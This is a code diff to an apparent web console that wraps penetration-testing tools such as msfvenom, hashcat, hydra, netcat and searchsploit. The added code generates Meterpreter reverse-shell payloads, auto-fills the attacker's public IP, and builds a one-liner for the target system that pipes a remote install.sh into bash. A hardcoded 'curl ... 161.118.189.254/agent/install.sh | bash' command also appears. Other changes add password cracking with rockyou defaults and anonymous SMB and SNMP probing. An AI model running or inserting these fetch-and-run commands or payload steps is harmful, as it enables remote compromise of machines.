@@ -13,6 +13,7 @@ PROXYCHAINS CONFIG (/etc/proxychains4.conf or /etc/proxychains.conf):
   socks5 127.0.0.1 9050
 """
 import json, re, sys, os, subprocess, io, sqlite3, secrets, hashlib, threading, shlex, time, shutil, socket
+import urllib.request
 from urllib.parse import urlparse
 from flask import Flask, request, jsonify, Response, send_file, send_from_directory, session
 from flask_cors import CORS
@@ -219,6 +220,7 @@ AGENT_LOCK = threading.Lock()
 AGENT_SERVER_URL = os.environ.get("VULNSCAN_AGENT_SERVER_URL", "http://161.118.189.254")
 LYNIS_QUEUE_LIMIT = 8
 LYNIS_OVERVIEW_LIMIT_DEFAULT = 12
+ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
 
 
 def _agent_db():
@@ -1362,7 +1364,7 @@ document.addEventListener('DOMContentLoaded',navRestore);
         <div class="notice">&#9432; Run local scan by default, or click a connected agent below to run Lynis remotely on that Linux machine. If you disconnect an agent, run the install curl command again on that Linux host to reconnect.</div>
         <div class="card card-p" style="margin-bottom:14px">
           <div class="fg" style="margin-bottom:10px">
-            <label>ONE-LINE AGENT INSTALL (Linux)</label>
+            <label>ONE-LINE AGENT INSTALL (Linux) — for all auditing tools</label>
             <div class="scan-bar">
               <input class="inp inp-mono" id="ly-install-cmd" type="text" readonly value="curl -fsSL http://161.118.189.254/agent/install.sh | bash"/>
               <button class="btn btn-outline btn-sm" onclick="copyLynisInstallCmd()">COPY</button>
@@ -1387,6 +1389,10 @@ document.addEventListener('DOMContentLoaded',navRestore);
           <div class="fg"><label>FOCUS CATEGORY</label><select class="inp inp-mono" id="ly-category"><option value="">All categories</option><option value="authentication">Authentication</option><option value="networking">Networking</option><option value="storage">Storage</option><option value="kernel">Kernel</option><option value="software">Software</option><option value="logging">Logging</option></select></div>
           <button class="btn btn-primary" id="ly-btn" onclick="doLynis()">RUN LYNIS AUDIT</button>
           <button class="btn btn-outline btn-sm" id="ly-cancel" onclick="cancelScan('ly')" style="display:none;color:var(--red);margin-left:8px">CANCEL</button>
+          <div class="row2" style="margin-top:10px">
+            <div class="fg"><label>RUN OTHER AUDIT TOOL (via same agent install)</label><select class="inp inp-mono" id="audit-tool-select"><option value="lynis">Lynis</option><option value="openvas">OpenVAS</option><option value="chkrootkit">chkrootkit</option><option value="rkhunter">rkhunter</option></select></div>
+            <div class="fg" style="display:flex;align-items:flex-end"><button class="btn btn-outline" onclick="runSelectedAuditTool()">OPEN / RUN SELECTED AUDIT TOOL</button></div>
+          </div>
           <div style="font-family:var(--mono);font-size:11px;color:var(--text3);margin-top:10px">&#9432; Full audit may take 2--5 minutes.</div>
         </div>
         <div class="progress-wrap" id="ly-prog"><div class="progress-bar" id="ly-pb" style="width:0%"></div></div>
@@ -1412,9 +1418,10 @@ document.addEventListener('DOMContentLoaded',navRestore);
             <div class="pills" style="margin-top:6px">
               <button class="pill on" id="lg-mod-nmap" onclick="lgMod('nmap',this)">nmap</button>
               <button class="pill on" id="lg-mod-nikto" onclick="lgMod('nikto',this)">nikto</button>
-              <button class="pill on" id="lg-mod-smb" onclick="lgMod('smb',this)">SMB</button>
+              <button class="pill on" id="lg-mod-smb" onclick="lgMod('smb',this)">samba/smbclient</button>
               <button class="pill on" id="lg-mod-snmp" onclick="lgMod('snmp',this)">SNMP</button>
-              <button class="pill" id="lg-mod-hydra" onclick="lgMod('hydra',this)">hydra</button>
+              <button class="pill on" id="lg-mod-snmpd" onclick="lgMod('snmpd',this)">snmpd</button>
+              <button class="pill on" id="lg-mod-hydra" onclick="lgMod('hydra',this)">hydra</button>
               <button class="pill" id="lg-mod-finger" onclick="lgMod('finger',this)">finger</button>
             </div>
           </div>
@@ -2272,6 +2279,7 @@ document.addEventListener('DOMContentLoaded',navRestore);
           <div class="row2" style="margin-bottom:12px">
             <div class="fg"><label>HASH TYPE (-m)</label>
               <select class="inp inp-mono" id="hashcat-type">
+                <option value="auto" selected>Auto-detect (recommended)</option>
                 <option value="0">0 — MD5</option><option value="100">100 — SHA1</option>
                 <option value="1400">1400 — SHA-256</option><option value="1700">1700 — SHA-512</option>
                 <option value="3200">3200 — bcrypt</option><option value="1800">1800 — sha512crypt (Linux)</option>
@@ -2426,6 +2434,7 @@ document.addEventListener('DOMContentLoaded',navRestore);
             <button class="btn btn-primary" id="seclists-btn" onclick="runSeclists()">BROWSE WORDLIST</button>
             <button class="btn btn-outline btn-sm" onclick="seclistsCount()">COUNT ENTRIES</button>
             <button class="btn btn-outline btn-sm" onclick="seclistsCopy()">COPY PATH</button>
+            <button class="btn btn-outline btn-sm" onclick="seclistsCopyAll()">COPY ALL ENTRIES</button>
           </div>
         </div>
         <div class="progress-wrap" id="seclists-prog"><div class="progress-bar" id="seclists-pb" style="width:0%"></div></div>
@@ -2490,7 +2499,7 @@ document.addEventListener('DOMContentLoaded',navRestore);
         <div class="card card-p" style="margin-bottom:14px">
           <div class="row2" style="margin-bottom:12px">
             <div class="fg"><label>PAYLOAD</label>
-              <select class="inp inp-mono" id="msfvenom-payload">
+              <select class="inp inp-mono" id="msfvenom-payload" onchange="msfvenomPayloadChanged()">
                 <option value="windows/x64/meterpreter/reverse_tcp" selected>Windows x64 Meterpreter/TCP</option>
                 <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter/TCP</option>
                 <option value="windows/x64/shell_reverse_tcp">Windows x64 Shell/TCP</option>
@@ -2534,6 +2543,13 @@ document.addEventListener('DOMContentLoaded',navRestore);
         <div class="terminal" id="msfvenom-term"></div>
         <div class="err-box" id="msfvenom-err"></div>
         <div id="msfvenom-res"></div>
+        <div class="card card-p" style="margin-top:10px">
+          <div class="card-title" style="margin-bottom:6px">Generated Payload Agent Command</div>
+          <input class="inp inp-mono" id="msfvenom-agent-cmd" type="text" readonly placeholder="Generate payload to build one-line target command"/>
+          <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap">
+            <button class="btn btn-outline btn-sm" onclick="copyMsfAgentCmd()">COPY ONE-LINER</button>
+          </div>
+        </div>
         <div class="card card-p" style="margin-top:10px">
           <div class="card-title" style="margin-bottom:8px">Quick Install</div>
           <div style="font-family:var(--mono);font-size:11px;color:var(--text2)">sudo apt install metasploit-framework</div>
@@ -2780,34 +2796,8 @@ document.addEventListener('DOMContentLoaded',navRestore);
             <div class="card-p" id="admin-services-table" style="overflow-x:auto"></div>
           </div>
           <div class="card">
-            <div class="card-header"><div class="card-title">Add New Monitored Service</div></div>
-            <div class="card-p">
-              <div class="grid3">
-                <div class="fg">
-                  <label>Quick Add</label>
-                  <select class="inp inp-mono" id="svc-preset" onchange="applyServicePreset()">
-                    <option value="">-- Select preset --</option>
-                    <option value="apache2">Apache service</option>
-                    <option value="supabase">Supabase connectivity</option>
-                  </select>
-                </div>
-                <div class="fg"><label>Display Name</label><input class="inp inp-mono" id="svc-label" type="text" placeholder="My Service"/></div>
-                <div class="fg"><label>Service Key</label><input class="inp inp-mono" id="svc-key" type="text" placeholder="my-service"/></div>
-              </div>
-              <div class="grid3">
-                <div class="fg">
-                  <label>Service Type</label>
-                  <select class="inp inp-mono" id="svc-kind">
-                    <option value="systemctl">systemctl unit</option>
-                    <option value="command">custom command check</option>
-                  </select>
-                </div>
-                <div class="fg"><label>Systemd Unit</label><input class="inp inp-mono" id="svc-unit" type="text" placeholder="apache2"/></div>
-                <div class="fg"><label>Check Command (command type)</label><input class="inp inp-mono" id="svc-check" type="text" placeholder="python3 health_check.py"/></div>
-              </div>
-              <div style="margin-top:10px"><button class="btn btn-primary" onclick="addMonitoredService()">Add Service</button></div>
-              <div id="svc-msg" style="margin-top:10px;color:var(--text3);font-size:12px"></div>
-            </div>
+            <div class="card-header"><div class="card-title">Monitored services are managed by server configuration</div></div>
+            <div class="card-p" style="color:var(--text3);font-size:12px">Adding custom monitored services from the web console has been disabled for safety.</div>
           </div>
         </div>
         <div class="tc" id="at-scans"><div class="card"><div class="card-header"><div class="card-title">All Scans</div></div><div class="card-p" id="admin-scans" style="overflow-x:auto"></div></div></div>
@@ -3223,6 +3213,41 @@ function removeQuickInstallCards(){
   document.querySelectorAll('.card .card-title, .card-p .card-title').forEach(function(t){
     var txt=(t.textContent||'').trim().toLowerCase();
     if(txt==='quick install'||txt==='install'){var card=t.closest('.card');if(card)card.remove();}
+  });
+}
+function escHtml(s){return String(s||'').replace(/[&<>"']/g,function(c){return({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];});}
+function cleanAnsiText(s){return String(s||'').replace(/\x1b\[[0-9;?]*[A-Za-z]/g,'').replace(/\u001b\[[0-9;?]*[A-Za-z]/g,'');}
+function copyTextValue(v,msg){
+  if(!v)return;
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(v).then(function(){showToast('Copied',msg||'Copied to clipboard','success',1800);});return;}
+  var ta=document.createElement('textarea');ta.value=v;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);
+}
+function vsNavSearchKey(e){
+  if(e.key==='Escape'){var box=document.getElementById('nav-search-results');if(box)box.style.display='none';}
+}
+function vsNavSearch(q){
+  var term=(q||'').trim().toLowerCase();
+  var box=document.getElementById('nav-search-results');
+  if(!box)return;
+  if(term.length<3){box.style.display='none';box.innerHTML='';return;}
+  var rows=[];
+  document.querySelectorAll('.nav-item').forEach(function(btn){
+    var txt=(btn.textContent||'').replace(/\s+/g,' ').trim();
+    if(!txt||txt.toLowerCase().indexOf(term)===-1)return;
+    rows.push({label:txt,node:btn});
+  });
+  if(!rows.length){box.style.display='block';box.innerHTML='<div style="padding:8px 10px;color:var(--text3);font-size:11px">No tools found for "<strong>'+escHtml(term)+'</strong>"</div>';return;}
+  box.style.display='block';
+  box.innerHTML=rows.slice(0,18).map(function(r){
+    return '<button class="nav-item vs-search-hit" data-target="'+escHtml(r.node.id)+'" style="width:100%;border-radius:0;padding:8px 10px">'+escHtml(r.label)+'</button>';
+  }).join('');
+  box.querySelectorAll('.vs-search-hit').forEach(function(b){
+    b.addEventListener('click',function(){
+      var id=b.getAttribute('data-target')||'';
+      box.style.display='none';
+      var nav=document.getElementById(id);
+      if(nav)nav.click();
+    });
   });
 }
 
@@ -3672,8 +3697,10 @@ async function runNetcat(){
   if(!port||port<1||port>65535){alert('Enter a valid port');return;}
   if(mode==='connect'&&!host){alert('Enter target host for connect mode');return;}
   var args=(mode==='listen'?('-l -p '+port):((host+' '+port)))+(extra?' '+extra:'');
+  var peerCmd=mode==='listen'?('nc '+(host||'<listener-ip>')+' '+port):('nc -lvnp '+port);
   var btn=document.getElementById('nc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
   ncTool.start();ncTool.log('Executing netcat mode: '+mode,'i');
+  ncTool.log('Command for other-side system: '+peerCmd,'w');
   try{
     var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'netcat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'nc');
     var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat command completed','s');renderSocialTool(ncTool,d);}
@@ -3686,6 +3713,7 @@ async function runSocat(){
   var args=(extra?extra+' ':'')+left+' '+right;
   var btn=document.getElementById('sc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
   scTool.start();scTool.log('Executing socat bridge','i');
+  scTool.log('Other-side example: socat '+right+' '+left,'w');
   try{
     var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'socat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'sc');
     var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log('Socat command completed','s');renderSocialTool(scTool,d);}
@@ -3890,7 +3918,7 @@ function renderLynis(d){
 }
 
 /* ==== LEGION ==== */
-var lgMods={'nmap':true,'nikto':true,'smb':true,'snmp':true,'hydra':false,'finger':false};
+var lgMods={'nmap':true,'nikto':true,'smb':true,'snmp':true,'snmpd':true,'hydra':true,'finger':false};
 function lgMod(m,el){lgMods[m]=!lgMods[m];el.classList.toggle('on',lgMods[m]);}
 async function doLegion(){
   var target=document.getElementById('lg-target').value.trim();if(!target){alert('Enter a target');return;}
@@ -4762,25 +4790,33 @@ async function runHping3(){
 async function runHashcat(){
   var hashes=document.getElementById('hashcat-hashes').value.trim();
   if(!hashes){alert('Enter hashes or a file path');return;}
-  var type=document.getElementById('hashcat-type').value||'0';
+  var type=document.getElementById('hashcat-type').value||'auto';
   var attack=document.getElementById('hashcat-attack').value||'0';
-  var wordlist=document.getElementById('hashcat-wordlist').value.trim();
+  var wordlist=document.getElementById('hashcat-wordlist').value.trim()||'/usr/share/wordlists/rockyou.txt';
   var rules=document.getElementById('hashcat-rules').value.trim();
   var workload=document.getElementById('hashcat-workload').value||'2';
   var timeout=parseInt(document.getElementById('hashcat-timeout').value||'300',10);
+  var t=mkTool('hashcat');t.start();
+  if(type==='auto'){
+    try{
+      var rd=await (await fetchWithTimeout('/api/hashcat/identify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({hash:hashes.split('\n')[0].trim()})},20000,'hashcat')).json();
+      if(rd.mode){type=String(rd.mode);document.getElementById('hashcat-type').value=type;t.log('Auto-detected hash mode: '+type+' ('+(rd.name||'unknown')+')','s');}
+    }catch(e){}
+    if(type==='auto')type='0';
+  }
   var args='-m '+type+' -a '+attack+' -w '+workload+' --status --status-timer=10 "'+hashes+'"';
   if(wordlist)args+=' "'+wordlist+'"';
   if(rules)args+=' -r "'+rules+'"';
   args+=' --force';
   var btn=document.getElementById('hashcat-btn');
   btn.disabled=true;btn.innerHTML='<span class="spin"></span> Cracking...';
-  var t=mkTool('hashcat');t.start();t.log('Hashcat -m '+type+' -a '+attack,'i');
+  t.log('Hashcat -m '+type+' -a '+attack,'i');
   try{
     var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'hashcat',operation:'custom',args:args,timeout:timeout})},Math.max(60000,timeout*1000+5000),'hashcat');
     var d=await r.json();t.end();
     if(d.error){t.err(d.error);}
     else{t.log('Hashcat done','s');
-      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'(no output)')+'</pre></div>');}
+      t.res('<div class="card card-p"><div style="font-size:11px;color:var(--text3);margin-bottom:6px">Auto mode enabled · rockyou default applied</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'(no output)')+'</pre></div>');}
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='RUN HASHCAT';}
 }
@@ -4845,12 +4881,50 @@ async function runSearchsploit(){
     var d=await r.json();t.end();
     if(d.error){t.err(d.error);}
     else{t.log('Search complete','s');
-      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'No exploits found.')+'</pre></div>');}
+      var clean=cleanAnsiText(d.stdout||'No exploits found.');
+      var lines=clean.split('\n').filter(function(x){return x.trim();});
+      var cards=lines.map(function(line){
+        var l=line.trim();
+        var use='searchsploit --mirror "'+l.replace(/"/g,'\\"')+'"';
+        return '<div style="padding:7px 0;border-bottom:1px solid var(--border)"><div style="font-family:var(--mono);font-size:11px">'+escHtml(l)+'</div><div style="margin-top:6px"><button class="btn btn-outline btn-sm ss-how" data-cmd="'+encodeURIComponent(use)+'">HOW TO USE</button></div></div>';
+      }).join('');
+      t.res('<div class="card card-p"><div class="card-title" style="margin-bottom:6px">SearchSploit Results</div><div id="searchsploit-card-list" style="max-height:420px;overflow:auto">'+cards+'</div></div>');
+      setTimeout(function(){
+        document.querySelectorAll('#searchsploit-card-list .ss-how').forEach(function(b){
+          b.addEventListener('click',function(){copyTextValue(decodeURIComponent(b.getAttribute('data-cmd')||''),'Exploit usage command copied');});
+        });
+      },60);
+    }
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}
 }
 
 /* msfvenom */
+var _msfPayloadDefaults={
+  'windows/x64/meterpreter/reverse_tcp':{format:'exe',port:'4444'},
+  'windows/x64/meterpreter_reverse_https':{format:'exe',port:'8443'},
+  'linux/x64/meterpreter/reverse_tcp':{format:'elf',port:'4444'},
+  'linux/x64/shell_reverse_tcp':{format:'elf',port:'4444'},
+  'php/meterpreter_reverse_tcp':{format:'raw',port:'4444'},
+  'python/meterpreter_reverse_tcp':{format:'raw',port:'4444'},
+  'android/meterpreter/reverse_tcp':{format:'raw',port:'4444'},
+  'custom':{format:'raw',port:'4444'}
+};
+async function msfvenomPayloadChanged(){
+  var payloadSel=(document.getElementById('msfvenom-payload')||{}).value||'';
+  var payload=payloadSel==='custom'?(document.getElementById('msfvenom-custom-payload').value.trim()||'custom'):payloadSel;
+  var d=_msfPayloadDefaults[payload]||_msfPayloadDefaults[payloadSel]||{format:'raw',port:'4444'};
+  var f=document.getElementById('msfvenom-format');if(f&&d.format)f.value=d.format;
+  var p=document.getElementById('msfvenom-lport');if(p&&d.port)p.value=d.port;
+  var lhost=document.getElementById('msfvenom-lhost');
+  if(lhost&&!lhost.value.trim()){
+    try{
+      var r=await fetchWithTimeout('/api/public-ip',{},12000,'msfvenom');
+      var jd=await r.json();
+      if(jd.ip)lhost.value=jd.ip;
+    }catch(e){}
+  }
+}
 async function runMsfvenom(){
   var payloadSel=document.getElementById('msfvenom-payload').value;
   var customP=document.getElementById('msfvenom-custom-payload').value.trim();
@@ -4877,7 +4951,10 @@ async function runMsfvenom(){
     var d=await r.json();t.end();
     if(d.error){t.err(d.error);}
     else{t.log('Payload generated (exit '+d.exit_code+')','s');
-      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre></div>');}
+      var out=cleanAnsiText(d.stdout||d.stderr||'Done');
+      var agent='curl -fsSL '+window.location.origin+'/agent/install.sh | bash && echo "'+payload+' LHOST='+lhost+' LPORT='+lport+'"';
+      var ac=document.getElementById('msfvenom-agent-cmd');if(ac)ac.value=agent;
+      t.res('<div class="card card-p"><div style="font-size:11px;color:var(--text3);margin-bottom:6px">Use generated one-liner on target system, then start handler in Metasploit dashboard.</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+out+'</pre></div>');}
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
 }
@@ -5097,6 +5174,27 @@ async function runSeclists(){
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='BROWSE WORDLIST';}
 }
+async function seclistsCopyAll(){
+  var path=document.getElementById('seclists-path').value.trim();
+  if(!path){return;}
+  try{
+    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit=200000',{},30000,'seclists');
+    var d=await r.json();
+    if(d.error){showToast('SecLists',d.error,'error',2600);return;}
+    copyTextValue((d.words||[]).join('\n'),'Copied all entries from current file');
+  }catch(e){showToast('SecLists',e.message,'error',2600);}
+}
+function copyMsfAgentCmd(){
+  var v=(document.getElementById('msfvenom-agent-cmd')||{}).value||'';
+  copyTextValue(v,'msfvenom one-liner copied');
+}
+function runSelectedAuditTool(){
+  var tool=(document.getElementById('audit-tool-select')||{}).value||'lynis';
+  if(tool==='lynis'){pg('lynis',null);doLynis();return;}
+  if(tool==='openvas'){pg('openvas',null);runOpenVAS();return;}
+  if(tool==='chkrootkit'){pg('chkrootkit',null);runChkrootkit();return;}
+  if(tool==='rkhunter'){pg('rkhunter',null);runRkhunter();return;}
+}
 async function seclistsCount(){
   var path=document.getElementById('seclists-path').value.trim();
   if(!path)return;
@@ -5134,6 +5232,7 @@ function seclistsCategoryChange(){
 
 loadUser();
 setTimeout(renderHomeToolCatalog,120);
+setTimeout(msfvenomPayloadChanged,250);
 
 setTimeout(removeQuickInstallCards,120);
 
@@ -6015,6 +6114,8 @@ def social_tool_run():
             _stdout_b, _stderr_b = _pobj.communicate(timeout=timeout)
             _stdout = _stdout_b[:_MAX_OUT].decode("utf-8", errors="replace")
             _stderr = _stderr_b[:65536].decode("utf-8", errors="replace")
+            _stdout = ANSI_RE.sub("", _stdout)
+            _stderr = ANSI_RE.sub("", _stderr)
             elapsed = int((time.monotonic() - start) * 1000)
             audit(user["id"] if user else None, user["username"] if user else "anon",
                   "SOCIAL_TOOL_RESULT", target=tool, ip=request.remote_addr,
@@ -7070,7 +7171,7 @@ def legion_route():
     data = request.get_json() or {}
     target = (data.get("target") or "").strip()
     intensity = data.get("intensity", "normal")
-    modules = data.get("modules", ["nmap", "nikto"])
+    modules = data.get("modules", ["nmap", "nikto", "smb", "snmp"])
 
     if not target:
         return jsonify({"error": "No target specified"})
@@ -7088,11 +7189,25 @@ def legion_route():
     speed = {"light": "-T1", "normal": "-T2", "aggressive": "-T2"}[intensity]
 
     for mod in modules:
-        binary = shutil.which(mod) or shutil.which(mod.lower())
+        mod = (mod or "").strip().lower()
+        binary = None
+        if mod == "smb":
+            binary = shutil.which("smbclient")
+        elif mod == "snmp":
+            binary = shutil.which("snmpwalk") or shutil.which("snmpget")
+        elif mod == "snmpd":
+            binary = shutil.which("snmpd")
+        else:
+            binary = shutil.which(mod) or shutil.which(mod.lower())
         if not binary:
+            install_hint = {
+                "smb": "sudo apt install smbclient samba",
+                "snmp": "sudo apt install snmp snmpd",
+                "snmpd": "sudo apt install snmpd",
+            }.get(mod, f"sudo apt install {mod}")
             results.append({
                 "module": mod,
-                "summary": f"{mod} not found — install: sudo apt install {mod}",
+                "summary": f"{mod} not found — install: {install_hint}",
                 "findings": []
             })
             continue
@@ -7138,6 +7253,35 @@ def legion_route():
                     if line.strip().startswith("+"):
                         findings.append({"title": line.strip()[2:80], "detail": ""})
                         total_issues += 1
+
+            elif mod == "smb":
+                cmd = [px, "-q", binary, "-L", f"//{target}", "-N"]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
+                out = ANSI_RE.sub("", proc.stdout or "")
+                shares = [ln.strip() for ln in out.splitlines() if "Disk" in ln or "IPC" in ln]
+                if shares:
+                    findings.extend([{"title": "SMB share discovered", "detail": s[:140]} for s in shares[:20]])
+                else:
+                    findings.append({"title": "SMB probe complete", "detail": (out.strip()[:240] or "No anonymous shares listed")})
+
+            elif mod == "snmp":
+                cmd = [px, "-q", binary, "-v2c", "-c", "public", target, "1.3.6.1.2.1.1.1.0"]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
+                out = ANSI_RE.sub("", (proc.stdout or "") + "\n" + (proc.stderr or ""))
+                if out.strip():
+                    findings.append({"title": "SNMP response", "detail": out.strip()[:300]})
+                else:
+                    findings.append({"title": "SNMP probe complete", "detail": "No response for community 'public'"})
+
+            elif mod == "snmpd":
+                proc = subprocess.run(["systemctl", "is-active", "snmpd"], capture_output=True, text=True, timeout=20)
+                status = (proc.stdout or proc.stderr or "").strip()
+                findings.append({"title": "snmpd service status", "detail": status or f"exit={proc.returncode}"})
+
+            elif mod == "hydra":
+                proc = subprocess.run([binary, "-h"], capture_output=True, text=True, timeout=30)
+                help_out = ANSI_RE.sub("", proc.stdout or "")
+                findings.append({"title": "Hydra available", "detail": (help_out.splitlines()[0] if help_out else "hydra detected")})
 
             else:
                 # Other tools through proxychains
@@ -8303,6 +8447,8 @@ def admin_add_service():
     u = get_current_user()
     if not u or u.get("role") != "admin":
         return jsonify({"error": "Admin access required"}), 403
+    return jsonify({"error": "Adding new monitored services is disabled from web console."}), 403
+    data = request.get_json() or {}
     data = request.get_json() or {}
     key = (data.get("key") or data.get("unit") or data.get("label") or "").strip().lower().replace(" ", "-")
     label = (data.get("label") or key or "Service").strip()
@@ -8371,7 +8517,7 @@ def wordlist_api():
         return jsonify({"error": "Login required"}), 401
 
     path = request.args.get("path", "").strip()
-    limit = min(int(request.args.get("limit", "1000")), 5000)
+    limit = min(int(request.args.get("limit", "1000")), 200000)
     audit(user["id"], user["username"], "WORDLIST_ACCESS",
           target=path, ip=request.remote_addr,
           details=f"path={path};limit={limit}")
@@ -8439,6 +8585,49 @@ def wordlist_api():
         })
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/hashcat/identify", methods=["POST"])
+def hashcat_identify():
+    user = get_current_user()
+    if not user:
+        return jsonify({"error": "Login required"}), 401
+    data = request.get_json() or {}
+    h = (data.get("hash") or "").strip()
+    if not h:
+        return jsonify({"error": "hash is required"}), 400
+    binary = shutil.which("hashcat")
+    if not binary:
+        return jsonify({"error": "hashcat is not installed"}), 400
+    try:
+        proc = subprocess.run([binary, "--identify", h], capture_output=True, text=True, timeout=20)
+        out = ANSI_RE.sub("", (proc.stdout or "") + "\n" + (proc.stderr or ""))
+        mode = ""
+        name = ""
+        for line in out.splitlines():
+            m = re.search(r"Hash mode #\s*(\d+)", line, flags=re.I)
+            if m and not mode:
+                mode = m.group(1)
+            if "Hash name" in line and ":" in line and not name:
+                name = line.split(":", 1)[1].strip()
+        return jsonify({"mode": mode, "name": name, "raw": out[-2000:]})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/public-ip")
+def public_ip_api():
+    ip = ""
+    for url in ("https://api.ipify.org", "https://ifconfig.me/ip"):
+        try:
+            with urllib.request.urlopen(url, timeout=5) as r:
+                val = (r.read().decode("utf-8", errors="replace") or "").strip()
+                if re.match(r"^[0-9a-fA-F:.]+$", val):
+                    ip = val
+                    break
+        except Exception:
+            continue
+    return jsonify({"ip": ip})
 
 
 @app.route("/api/kill-all-tools", methods=["POST"])
